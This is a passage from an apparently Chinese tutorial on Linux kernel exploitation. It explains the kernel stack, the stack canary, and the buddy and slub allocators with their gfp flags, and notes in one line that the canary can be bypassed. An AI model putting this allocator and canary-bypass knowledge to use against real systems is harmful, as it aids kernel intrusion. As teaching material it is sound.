<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="title class_">thread_union</span> &#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">thread_info</span> thread_info;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack[THREAD_SIZE/<span class="built_in">sizeof</span>(<span class="type">long</span>)];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THREAD_SIZE (2*PAGE_SIZE)</span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/kernel_stack.png"
                      alt="kernel_stack"
                ></p>
<p>内核定义了一个<code>thread_union</code>的联合体，联合体的作用就是<code>thread_info</code>和<code>stack</code>共用一块内存区域。而<code>THREAD_SIZE</code>就是内核栈的大小，<code>x86-64</code>定义<code>THREAD_SIZE</code>的大小为<code>8K</code>。</p>
<h4 id="内核栈保护"><a href="#内核栈保护" class="headerlink" title="内核栈保护"></a>内核栈保护</h4><h5 id="STACK-PROTECTOR"><a href="#STACK-PROTECTOR" class="headerlink" title="STACK PROTECTOR"></a><strong>STACK PROTECTOR</strong></h5><p>类似于用户态程序的 <code>canary</code>，通常又被称作是 <code>stack cookie</code>，用以检测是否发生内核堆栈溢出，若是发生内核堆栈溢出则会产生 <code>kernel panic</code> 。</p>
<ul>
<li><strong>开启：</strong> 在编译内核时，我们可以设置 <code>CONFIG_CC_STACKPROTECTOR</code> 选项，来开启该保护。</li>
<li><strong>关闭：</strong> 我们需要重新编译内核，并关闭编译选项才可以关闭 <code>Canary</code> 保护。</li>
</ul>
<p>内核中的<code>canary</code>的值通常取自<code>gs</code>段寄存器某个固定偏移处的值，可以直接绕过。</p>
<h3 id="内核堆"><a href="#内核堆" class="headerlink" title="内核堆"></a>内核堆</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>Linux kernel 将内存分为 <code>页→区→节点</code> 三级结构，主要有两个内存管理器—— <code>buddy system</code> 与 <code>slab allocator</code>，前者负责以内存页为粒度管理所有可用的物理内存，后者则向前者请求内存页并划分为多个较小的对象（object）以进行细粒度的内存管理。</p>
<p><strong>页→区→节点三级结构</strong></p>
<p>这是一张十分经典的 <em>Overview</em> ，自顶向下是</p>
<ul>
<li><strong>页</strong>（page，对应结构体 page）</li>
<li><strong>区</strong>（zone，对应结构体 zone，图上展示了三种类型的 zone）</li>
<li><strong>节点</strong>（node，对应结构体 pgdata_list）</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/page-zone-node.png"
                      alt="page-zone-node"
                ></p>
<p><strong>页(page)</strong></p>
<p>Linux kernel 中使用 <code>page</code> 结构体来表示一个物理页框，<strong>每个物理页框都有着一个对应的 page 结构体</strong>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/page_struct.png"
                      alt="page_struct"
                ></p>
<p><strong>区(zone)</strong></p>
<p>在 Linux 下将一个节点内不同用途的内存区域划分为不同的 <code>区（zone）</code>，对应结构体 <code>struct zone</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/zone_struct.png"
                      alt="zone_struct"
                ></p>
<p><strong>节点(node)</strong></p>
<p>zone 再向上一层便是<strong>节点</strong>——Linux 将内存控制器（memory controller）作为节点划分的依据，对于 UMA 架构而言只有一个节点，而对于 NUMA 架构而言通常有多个节点，对于同一个内存控制器下的 CPU 而言其对应的节点称之为本地内存，不同处理器之间通过总线进行进一步的连接。如下图所示，一个 MC 对应一个节点。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/node_numa.png"
                      alt="node_numa"
                ></p>
<p><strong>buddy system</strong></p>
<p>buddy system 是 Linux kernel 中的一个较为底层的内存管理系统，<strong>以内存页为粒度管理着所有的物理内存</strong>，其存在于 <strong>区</strong> 这一级别，对当前区所对应拥有的所有物理页框进行管理.在每个 zone 结构体中都有一个 free_area 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong>:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>    <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中的 <code>MAX_ORDER</code> 为一个常量，值为 11。在 buddy system 中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：2^oeder。</p>
<p>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，由此我们得到这样一张 Overview：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/zone_struct.png"
                      alt="zone_struct"
                ></p>
<ul>
<li>分配：<ul>
<li>首先会将请求的内存大小向 2 的幂次方张内存页大小对齐，之后从对应的下标取出连续内存页。</li>
<li>若对应下标链表为空，则会从下一个 order 中取出内存页，一分为二，装载到当前下标对应链表中，之后再返还给上层调用，若下一个 order 也为空则会继续向更高的 order 进行该请求过程。</li>
</ul>
</li>
<li>释放：<ul>
<li>将对应的连续内存页释放到对应的链表上。</li>
<li>检索是否有可以合并的内存页，若有，则进行合成，放入更高 order 的链表中。</li>
</ul>
</li>
</ul>
<p><strong>slub allocator</strong></p>
<p>slab allocator 则是更为细粒度的内存管理器，其通过向 buddy system 请求单张或多张连续内存页后再分割成同等大小的<strong>对象</strong>（object）返还给上层调用者来实现更为细粒度的内存管理。</p>
<p>slab allocator 一共有三种版本：</p>
<ul>
<li>slab（最初的版本，机制比较复杂，效率不高）</li>
<li>slob（用于嵌入式等场景的极为简化版本）</li>
<li>slub（优化后的版本，<strong>现在的通用版本</strong>）</li>
</ul>
<p><strong>slub 基本结构</strong></p>
<p><code>slub</code> 版本的 allocator 为现在绝大多数 Linux kernel 所装配的版本，因此本篇文章主要叙述的也是 slub allocator，其基本结构如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/slub_allocator.png"
                      alt="slub_allocator"
                ></p>
<p>我们将 slub allocator 每次向 buddy system 请求得来的单张 &#x2F; 多张内存页称之为一个 <code>slub</code>，其被分割为多个同等大小对象（object），每个 object 作为一个被分配实体，在 slub 的第一张内存页对应的 page 结构体上的 freelist  成员指向该张内存页上的第一个空闲对象，一个 slub 上的所有空闲对象组成一个以 NULL 结尾的单向链表。</p>
<blockquote>
<p>一个 object 可以理解为用户态 glibc 中的 chunk，不过 object 并不像 chunk 那样需要有一个 header，因为  page 结构体与物理内存间存在线性对应关系，我们可以直接通过 object 地址找到其对应的 page 结构体。</p>
</blockquote>
<p><code>kmem_cache</code> 为一个基本的 allocator 组件，其用于分配某个特定大小（某种特定用途）的对象，所有的 kmem_cache 构成一个双向链表，并存在两个对应的结构体数组 <code>kmalloc_caches</code> 与 <code>kmalloc_dma_caches</code>。</p>
<p>一个 <code>kmem_cache</code> 主要由两个模块组成：</p>
<ul>
<li><code>kmem_cache_cpu</code>：这是一个 <strong>percpu 变量</strong>（即每个核心上都独立保留有一个副本，原理是以 gs 寄存器作为 percpu 段的基址进行寻址），用以表示当前核心正在使用的 slub，因此当前 CPU 在从 kmem_cache_cpu 上取 object 时<strong>不需要加锁</strong>，从而极大地提高了性能。</li>
<li><code>kmem_cache_node</code>：可以理解为当前 kmem_cache 的 slub 集散中心，其中存放着两个 slub 链表：<ul>
<li>partial：该 slub 上存在着一定数量的空闲 object，但并非全部空闲。</li>
<li>full：该 slub 上的所有 object 都被分配出去了。</li>
</ul>
</li>
</ul>
<p><strong>slub 分配和释放</strong></p>
<ul>
<li>分配：<ul>
<li>首先从 <code>kmem_cache_cpu</code> 上取对象，若有则直接返回。</li>
<li>若 <code>kmem_cache_cpu</code> 上的 slub 已经无空闲对象了，对应 slub 会被从 <code>kmem_cache_cpu</code> 上取下，并尝试从 <strong>partial</strong> 链表上取一个 slub 挂载到 <code>kmem_cache_cpu</code> 上，然后再取出空闲对象返回。</li>
<li>若 <code>kmem_cache_node</code> 的 partial 链表也空了，那就<strong>向 buddy system 请求分配新的内存页</strong>，划分为多个 object 之后再给到 <code>kmem_cache_cpu</code>，取空闲对象返回上层调用。</li>
</ul>
</li>
<li>释放：<ul>
<li>若被释放 object 属于 <code>kmem_cache_cpu</code> 的 slub，直接使用头插法插入当前 CPU slub 的 freelist。</li>
<li>若被释放 object 属于 <code>kmem_cache_node</code> 的 partial 链表上的 slub，直接使用头插法插入对应 slub 的 freelist。</li>
<li>若被释放 object 为 full slub，则其会成为对应 slub 的 freelist 头节点，<strong>且该 slub 会被放置到 partial 链表</strong>。</li>
</ul>
</li>
</ul>
<h4 id="buddy-system"><a href="#buddy-system" class="headerlink" title="buddy system"></a>buddy system</h4><h5 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h5><p>以 Discontiguous Memory 模型为例，buddy system 相关的数据结构关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/buddy_sys_sky.png"
                      alt="buddy_sys_sky"
                ></p>
<p><strong>node_data</strong></p>
<p><code>node_data</code> 是一个 <code>pg_data_t </code> 类型的结构体数组，其中每个元素代表一个内存节点。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pg_data_t</span> node_data[MAX_NUMNODES];</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>pg_data_t</code> 中与 buddy system 相关的成员如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span>	<span class="comment">/* Pointer to actual zone */</span></span><br><span class="line">	<span class="type">int</span> zone_idx;		<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> <span class="title">node_zones</span>[<span class="title">MAX_NR_ZONES</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> <span class="title">node_zonelists</span>[<span class="title">MAX_ZONELISTS</span>];</span></span><br><span class="line">	<span class="type">int</span> nr_zones;</span><br><span class="line">	...</span><br><span class="line">&#125; <span class="type">pg_data_t</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>node_zones</code> ：该节点所拥有的 <code>zones</code>。 并非所有的 zone 都已被填充，但这是一个满的列表。</li>
<li><code>node_zonelists</code>：记录 <code>zone</code> 的列表。通常一个内存节点包含两个 <code>zonelist</code>，一个是 <code>ZONELIST_FALLBACK</code> ，表示本地的；另外一个是 <code>ZONELIST_NOFALLBACK</code> ，表示远端的。</li>
<li><code>nr_zones</code>：<code>node_zones</code> 中有效 <code>zone</code> 的数量。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/node_data.png"
                      alt="node_data"
                ></p>
<p><strong>zone</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		nr_free;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>	<span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line">	....</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure></div>

<p>每个 <code>zone</code> 结构体中都有一个 <code>free_area</code> 结构体数组，用以存储 buddy system 按照 <code>order</code> 管理的页面。<code>free_area</code> 中第 i 个成员管理每块为连续 2^i 个内存页的内存。因为 <code>MAX_ORDER</code> 为11, buddy system 能分配的最大内存为 4MB 。</p>
<p><code>free_area</code> 中并非只有 <code>MAX_ORDER</code> 个双向链表分别代表着不同的“迁移类型”（migrate type），这是由于页面迁移机制的存在。<br> 页面迁移主要用以解决内核空间中的碎片问题，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核有可能无法映射到足够大的连续内存，因此需要进行页面迁移。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/page_pivote.png"
                      alt="page_pivote"
                ></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">	MIGRATE_UNMOVABLE,</span><br><span class="line">	MIGRATE_MOVABLE,</span><br><span class="line">	MIGRATE_RECLAIMABLE,</span><br><span class="line">	MIGRATE_PCPTYPES,	<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">	MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment">	 * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment">	 * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment">	 * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment">	 * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment">	 * __free_pageblock_cma() function.  What is important though</span></span><br><span class="line"><span class="comment">	 * is that a range of pageblocks must be aligned to</span></span><br><span class="line"><span class="comment">	 * MAX_ORDER_NR_PAGES should biggest page be bigger then</span></span><br><span class="line"><span class="comment">	 * a single pageblock.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">	MIGRATE_ISOLATE,	<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>但并非所有的页面都是能够随意迁移的，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类。迁移类型由一个枚举类型定义，定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p>
<ul>
<li><code>MIGRATE_UNMOVABLE</code>：这类型页面在内存当中有着固定的位置，不能移动。</li>
<li><code>MIGRATE_MOVABLE</code>：这类页面可以随意移动，例如用户空间的页面，我们只需要复制数据后改变页表映射即可。</li>
<li><code>MIGRATE_RECLAIMABLE</code>：这类页面不能直接移动，但是可以删除，例如映射自文件的页。</li>
<li><code>MIGRATE_PCPTYPES</code>：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移仅限于同一节点内。</li>
<li><code>MIGRATE_CMA</code>：Contiguous Memory Allocator，即连续的物理内存。</li>
<li><code>MIGRATE_ISOLATE</code>：不能从该链表分配页面，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点。</li>
<li><code>MIGRATE_TYPES</code>：表示迁移类型的数目，并不存在这一链表。</li>
</ul>
<p><code>nr_free</code> 字段记录了在当前 <code>free_area</code> 中的空闲页面块的数量，对于 <code>free_area[0]</code> 以外的 <code>free_area</code> 而言其单位并非是单个页框，而是以内存块为单位。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/free_area.png"
                      alt="free_area"
                ></p>
<p><strong>page</strong></p>
<p>我们不难看出：<code>free_area</code> 的 <code>free_list</code> 字段便是用以存放指向空闲页面的指针，其通过 <code>page</code> 结构体的 <code>lru</code> 字段将 <code>page</code> 结构体连接成双向链表。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span>	<span class="comment">/* Page cache and anonymous pages */</span></span><br><span class="line">			<span class="comment">/**</span></span><br><span class="line"><span class="comment">			 * @lru: Pageout list, eg. active_list protected by</span></span><br><span class="line"><span class="comment">			 * zone_lru_lock.  Sometimes used as a generic list</span></span><br><span class="line"><span class="comment">			 * by the page owner.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br></pre></td></tr></table></figure></div>

<p><code>page</code> 结构体中的 <code>lru</code> 这一字段的类型为 <code>struct list_head</code>，这是内核编程中通用的双向链表结构，<code>free_list</code> 与 <code>lru</code> 链表都使用该字段 将页结构体组织为双向链表，即一个页是不可能同时出现在 <code>lru</code> 链表与 <code>buddy system</code> 中的。</p>
<p><strong>alloc_context</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zone</span> *<span class="title">zone</span>;</span>	<span class="comment">/* Pointer to actual zone */</span></span><br><span class="line">	<span class="type">int</span> zone_idx;		<span class="comment">/* zone_idx(zoneref-&gt;zone) */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> _<span class="title">zonerefs</span>[<span class="title">MAX_ZONES_PER_ZONELIST</span> + 1];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alloc_context</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zonelist</span> *<span class="title">zonelist</span>;</span></span><br><span class="line">	<span class="type">nodemask_t</span> *nodemask;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">zoneref</span> *<span class="title">preferred_zoneref</span>;</span></span><br><span class="line">	<span class="type">int</span> migratetype;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">high_zoneidx</span>;</span></span><br><span class="line">	<span class="type">bool</span> spread_dirty_pages;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>alloc_context</code> 数据结构是一个内部临时使用的数据结构。</p>
<ul>
<li><code>zonelist</code> 指向每一个内存节点中对应的 <code>zonelist</code>；</li>
<li><code>nodemask</code> 表示内存节点的掩码；</li>
<li><code>preferred_zoneref</code> 表示首选 <code>zone</code> 的 <code>zoneref</code>;</li>
<li><code>migratetype</code> 表示迁移类型；</li>
<li><code>high_zoneidx</code> 分配掩码计算 <code>zone</code> 的 <code>zoneidx</code>,表示这个分配掩码允许内存分配的最高 <code>zone</code>；</li>
<li><code>spread_dirty_pages</code> 用于指定是否传播脏页。</li>
</ul>
<h5 id="分配掩码"><a href="#分配掩码" class="headerlink" title="分配掩码"></a>分配掩码</h5><p>分配掩码是描述页面分配方法的标志，它影响着页面分配的整个流程。因为 Linux 内核是一个通用的操作系统，所以页面分配器被设计成一个复杂的系统。它既要高效，又要兼顾很多种情况，特别是在内存紧张的情况下的内存分配。<code>gfp_mask</code> 其实被定义成一个 <code>unsigned</code> 类型的变量。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> __bitwise <span class="type">gfp_t</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>内存管理区修饰符(zone modifier)。</li>
<li>移动修饰符（mobility and placement modifier)。</li>
<li>水位修饰符（watermark modifier)。</li>
<li>页面回收修饰符(page reclaim modifier)。</li>
<li>行为修饰符(action modifier)。</li>
</ul>
<p><strong>内存管理区修饰符</strong></p>
<p>内存管理区修饰符主要用于表示应当从哪些内存管理区中来分配物理内存。内存管理区修饰符使用<code>gfp_mask</code> 的低 4 位来表示。</p>
<ul>
<li><code>___GFP_DMA</code>：从 <code>ZONE_DMA</code> 中分配内存</li>
<li><code>___GFP_DMA32</code>：从 <code>ZONE_DMA32</code> 中分配内存</li>
<li><code>___GFP _HIGHMEM</code>：优先从 <code>ZONE_HIGHMEM</code> 中分配内存</li>
<li><code>___GFP_MOVABLE</code>：页面可以被迁移或者回收，如用于内存规整机制</li>
</ul>
<p><strong>移动修饰符</strong></p>
<p>移动修饰符主要用于指示分配出来的页面具有的迁移属性。在 Linux2.6.24 内核中，为了解决外碎片化的问题，引入了迁移类型，因此在分配内存时需要指定所分配的页面具有哪些迁移属性。</p>
<ul>
<li><code>___GFP_RECLAIMABLE</code>：在 slab 分配器中指定了 <code>SLAB_RECLAIM_ACCOUNT</code> 标志位，表示 slab 分配器中使用的页面可以通过收割机来回收</li>
<li><code>___GFP_HARDWALL</code>：使能 cpusect 内存分配策略</li>
<li><code>___GFP_THISNODE</code>：从指定的内存节点中分配内存，并且没有回退机制</li>
<li><code>___GFP_ACCOUNT</code>：分配过程会被 kmemcg 记录</li>
</ul>
<p><strong>水位修饰符</strong></p>
<p>水位修饰符用于控制是否可以访问系统预留的内存。所谓系统预留内存指的是最低警戒水位以下的内存，一般优先级的分配请求是不能访问它们的，只有高优先级的分配请求才能访问，如 <code>___GFP_HIGH</code> 、<code>___GFP_ATOMIC</code> 等。</p>
<ul>
<li><code>___GFP_HIGH</code>：表示分配内存具有高优先级，并且这个分配请求是很有必要的，分配器可以使用系统预留的内存(即最低警戒水位线下的预留内存)</li>
<li><code>___GFP_ATOMIC</code>：表示分配内存的过程不能执行页面回收或者睡眠动作，并且具有很高的优先级，可以访问系统预留的内存。常见的一个场景是在中断上下文中分配内存</li>
<li><code>___GFP_MEMALLOC</code>：分配过程中允许访问所有的内存，包括系统预留的内存。分配内存进程通常要保证在分配内存过程中很快会有内存被释放，如进程退出或者页面回收</li>
<li><code>___GFP_NOMEMALLOC</code>：分配过程不允许访问系统预留的内存</li>
</ul>
<p><strong>页面回收修饰符</strong></p>
<ul>
<li><code>___GFP_IO</code>：允许开启I&#x2F;O传输</li>
<li><code>___GFP_FS</code>：允许调用底层的文件系统。这个标志清零通常是为了避免死锁的发生，如果相应的文件系统操作路径上已经持有了锁，分配内存过程又递归地调用这个文件系统的相应操作路径，可能会产生死锁</li>
<li><code>___GFP_DIRECT_RECLAIM</code>：分配内存的过程中允许使用页面直接回收机制</li>
<li><code>___GFP_KSWAPD_RECLAIM</code>：表示当到达内存管理区的低水位时会唤醒 kswapd 内核线程，以异步地回收内存，直到内存管理区恢复到了高水位为止</li>
<li><code>___GFP_RECLAIM</code>：用于允许或者禁止直接页面回收和 kswapd 内核线程</li>
<li><code>___GFP_REPEAT</code>：当分配失败时会继续尝试</li>
<li><code>___GFP_NOFAIL</code>：当分配失败时会无限地尝试下去，直到分配成功为止。当分配者希望分配内存不失败时，应该使用这个标志位，而不是自己写一个 while 循环来不断地调用页面分配接口函数</li>
<li><code>___GFP_NORETRY</code>：当使用了直接页面回收和内存规整等机制还无法分配内存时，最好不要重复尝试分配了，直接返回 NULL</li>
</ul>
<p><strong>行为修饰符</strong></p>
<ul>
<li><code>___GFP_COLD</code>：分配的内存不会马上被使用。通常会返回一个空的高速缓存页面</li>
<li><code>___GFP_NOWARN</code>：关闭分配过程中的一些错误报告</li>
<li><code>___GFP_ZERO</code>：返回一个全部填充为 0 的页面</li>
<li><code>___GFP_NOTRACK</code>：不被kmemcheck 机制跟踪</li>
<li><code>___GFP_OTHER NODE</code>：在远端的一个内存节点上分配。通常在 khugepaged 内核线程中使用</li>
</ul>
<p><strong>类型标志</strong></p>
<p>前文列出了 5 大类修饰符的标志，对于内核开发者或者驱动开发者来说，要正确使用这些标志是一件很困难的事情，因此定义了一些常用的标志的组合—类型标志（type flag)</p>
<ul>
